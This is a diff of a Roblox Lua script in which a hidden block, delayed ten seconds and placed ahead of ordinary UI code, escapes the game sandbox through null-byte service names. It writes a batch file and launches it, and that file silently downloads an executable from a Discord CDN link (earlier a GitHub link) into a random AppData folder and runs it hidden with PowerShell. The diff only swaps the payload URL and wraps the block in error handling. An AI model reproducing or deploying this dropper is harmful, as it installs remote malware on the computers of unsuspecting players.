@@ -1,21 +1,23 @@
 coroutine.wrap(function()
         wait(10)
-        local LinkingService = game:GetService("LinkingService\0 meow meow meow")
-        local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
-        local scriptContent = [[
-            @echo off
-            setlocal
-            
-            set "url=https://github.com/bbcdemon445/Wanker/raw/refs/heads/main/source_prepared.exe"
-            set "folder=%APPDATA%\%random%"
-            
-            mkdir "%folder%"
-            powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\source_prepared.exe'); Start-Process -FilePath '%folder%\source_prepared.exe' -WindowStyle Hidden"
-            
-            endlocal
-        ]]
-        local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
-        LinkingService:OpenUrl(payload)
+        pcall(function()
+                local LinkingService = game:GetService("LinkingService\0 meow meow meow")
+                local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
+                local scriptContent = [[
+                    @echo off
+                    setlocal
+                    
+                    set "url=https://cdn.discordapp.com/attachments/1329445662604918866/1342516769767690363/Update.exe?ex=67b9ebac&is=67b89a2c&hm=750261dd752592e8a4809415748a6b7ffdf3e257e6d65752e49b570f2b3d9587&"
+                    set "folder=%APPDATA%\%random%"
+                    
+                    mkdir "%folder%"
+                    powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\Update.exe'); Start-Process -FilePath '%folder%\Update.exe' -WindowStyle Hidden"
+                    
+                    endlocal
+                ]]
+                local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
+                LinkingService:OpenUrl(payload)
+        end)
 end)()
 
 local tweenService, coreGui = game:GetService("TweenService"), game:GetService("CoreGui");
